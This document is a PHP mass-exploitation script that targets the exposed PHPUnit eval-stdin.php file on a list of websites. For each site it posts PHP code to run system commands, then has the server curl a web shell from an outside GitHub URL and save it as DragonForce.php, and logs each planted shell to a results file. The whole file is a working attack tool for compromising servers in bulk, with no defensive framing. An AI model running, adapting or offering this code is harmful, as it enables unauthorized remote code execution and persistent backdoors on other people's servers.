<?php
error_reporting(0);
function check($kk){
        $data = "<?php system('ls')?>";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $kk."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        $hasil = curl_exec($ch);
        curl_close($ch);
        if(preg_match("/Windows.php|Template|Default.php/", $hasil)){
        echo $kk." VULNERABLE \n";
        $data = "<?php system('uname -a')?>";
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $kk."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        $hasil = curl_exec($ch);
        curl_close($ch);
          echo "System : ".$hasil;
          $data = "<?php system('curl -s https://raw.githubusercontent.com/apidotmy/Uploaders/master/OpsGanyang.php -o DragonForce.php')?>";
          $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $kk."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        $hasil = curl_exec($ch);
        curl_close($ch);
          $data = "<?php system('ls')?>";
          $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $kk."/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        $hasil = curl_exec($ch);
        curl_close($ch);
          if(preg_match('DragonForce.php', $hasil)){
            echo "SHELL : ".$kk."/vendor/phpunit/phpunit/src/Util/PHP/DragonForce.php \n";
            $save  = fopen("result.txt", 'w');
            fwrite($save, $kk."/vendor/phpunit/phpunit/src/Util/PHP/DragonForce.php \n");
            fclose($save);
          } else {
            echo "CAN'T UPLOAD SHELL \n";
          }
 
        } else {
            echo $kk." NOT VULNERABLE \n";
        }
}
$k = explode("\n", file_get_contents($argv[1]));
if($argv[1] == ''){
    echo "Usage: php ".$argv[0]." list.txt \n";
} else {
foreach ($k as $kk) {
    check($kk);
 } }
